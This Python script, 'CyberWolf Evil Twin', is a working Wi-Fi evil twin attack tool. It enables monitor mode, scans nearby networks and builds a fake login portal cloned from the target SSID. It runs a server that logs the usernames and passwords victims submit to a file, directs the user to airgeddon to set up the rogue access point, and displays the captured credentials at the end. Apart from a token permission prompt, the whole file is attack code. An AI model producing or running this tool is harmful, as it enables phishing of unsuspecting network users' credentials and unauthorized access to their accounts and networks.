#!/usr/bin/env python3
"""
CyberWolf Evil Twin - Working Version
"""

import subprocess
import os
import time
import threading
from datetime import datetime

class WorkingEvilTwin:
    def __init__(self):
        self.target = None
        self.captured_creds = []
        
    def banner(self):
        print("""
╔══════════════════════════════════════════════════════════════════╗
║         🐺 CYBERWOLF EVIL TWIN FRAMEWORK 🐺                      ║
╚══════════════════════════════════════════════════════════════════╝
        """)
    
    def check_permission(self):
        print("\n[!] LEGAL REQUIREMENT")
        answer = input("Do you have written permission to test? (yes/no): ")
        if answer.lower() not in ['yes', 'y']:
            print("\n[!] Authorization required. Exiting.")
            return False
        return True
    
    def start_monitor_mode(self):
        print("\n[*] Starting monitor mode...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
        result = subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], capture_output=True)
        if result.returncode == 0:
            print("[+] Monitor mode active on wlan0mon")
            return True
        else:
            print("[-] Failed to start monitor mode")
            return False
    
    def scan_networks(self):
        print("\n[*] Scanning for networks (15 seconds)...")
        
        scan_process = subprocess.Popen(
            ["sudo", "airodump-ng", "wlan0mon", "--write", "/tmp/scan", "--output-format", "csv"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        for i in range(15):
            print(f"\r[*] Scanning... {15-i} seconds remaining", end="")
            time.sleep(1)
        
        scan_process.terminate()
        time.sleep(2)
        print("\n[+] Scan complete!")
        
        networks = []
        try:
            with open("/tmp/scan-01.csv", "r") as f:
                lines = f.readlines()
            
            for line in lines:
                if "WPA" in line or "WEP" in line or "OPEN" in line:
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip() if len(parts) > 13 else "Hidden"
                        if bssid and bssid != "BSSID" and essid and essid != "":
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'essid': essid
                            })
        except:
            pass
        
        if networks:
            print("\n[+] Available Networks:")
            print("-" * 60)
            for i, net in enumerate(networks[:10]):
                print(f"  {i+1}. {net['essid']} (Channel {net['channel']})")
            print("-" * 60)
        else:
            print("\n[-] No networks found.")
        
        return networks
    
    def generate_phishing_page(self, ssid):
        os.makedirs("portals", exist_ok=True)
        
        html = f'''<!DOCTYPE html>
<html>
<head><title>{ssid} Portal</title>
<style>
body{{background:#1a1a2e;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;}}
.container{{background:white;padding:40px;border-radius:10px;width:350px;}}
input{{width:100%;padding:10px;margin:10px 0;}}
button{{width:100%;padding:10px;background:#00ff88;border:none;cursor:pointer;}}
</style>
</head>
<body>
<div class="container">
<h2>{ssid} Login</h2>
<form action="http://localhost:8080/capture" method="POST">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
</div>
</body>
</html>'''
        
        filename = f"portals/{ssid.replace(' ', '_')}.html"
        with open(filename, 'w') as f:
            f.write(html)
        print(f"[+] Phishing page created: {filename}")
        return filename
    
    def start_credential_server(self):
        from http.server import HTTPServer, BaseHTTPRequestHandler
        
        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):
                length = int(self.headers['Content-Length'])
                data = self.rfile.read(length).decode()
                print(f"\n[!] CREDENTIALS CAPTURED: {data}")
                with open('captured.txt', 'a') as f:
                    f.write(f"{datetime.now()}: {data}\n")
                self.send_response(200)
                self.end_headers()
            
            def log_message(self, format, *args):
                pass
        
        server = HTTPServer(('0.0.0.0', 8080), Handler)
        print("[*] Credential server running on port 8080")
        server.serve_forever()
    
    def show_instructions(self, target_ssid):
        print(f"""

╔══════════════════════════════════════════════════════════════════╗
║                    📋 OPEN 3 TERMINALS 📋                        ║
╚══════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📟 TERMINAL 1 - Create Evil Twin AP:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sudo airgeddon

Then in Airgeddon:
1. Select interface: wlan0mon
2. Choose "Evil Twin Attacks"
3. Select target: {target_ssid}
4. Follow the prompts

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📟 TERMINAL 2 - Serve Phishing Page:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
cd ~/cyberwolf-evil-twin/portals
sudo python3 -m http.server 80

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📟 TERMINAL 3 - Monitor Captured Credentials:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
cd ~/cyberwolf-evil-twin
tail -f captured.txt

""")
        input("Press Enter after you have opened the 3 terminals...")
    
    def run(self):
        self.banner()
        
        if not self.check_permission():
            return
        
        if not self.start_monitor_mode():
            return
        
        networks = self.scan_networks()
        
        if not networks:
            return
        
        try:
            choice = int(input("\n[?] Select target number: ")) - 1
            self.target = networks[choice]
        except:
            print("[-] Invalid selection")
            return
        
        print(f"\n[+] Target selected: {self.target['essid']}")
        
        # Generate phishing page
        self.generate_phishing_page(self.target['essid'])
        
        # Start credential server in background
        server_thread = threading.Thread(target=self.start_credential_server, daemon=True)
        server_thread.start()
        
        # Show instructions
        self.show_instructions(self.target['essid'])
        
        input("\n[!] Press Enter to stop attack and cleanup...")
        
        # Cleanup
        print("\n[*] Cleaning up...")
        subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"], capture_output=True)
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True)
        
        # Show captured credentials
        if os.path.exists('captured.txt'):
            print("\n📋 CAPTURED CREDENTIALS:")
            os.system('cat captured.txt')
        
        print("\n[+] Done!")

if __name__ == "__main__":
    try:
        app = WorkingEvilTwin()
        app.run()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted")
        subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"], capture_output=True)
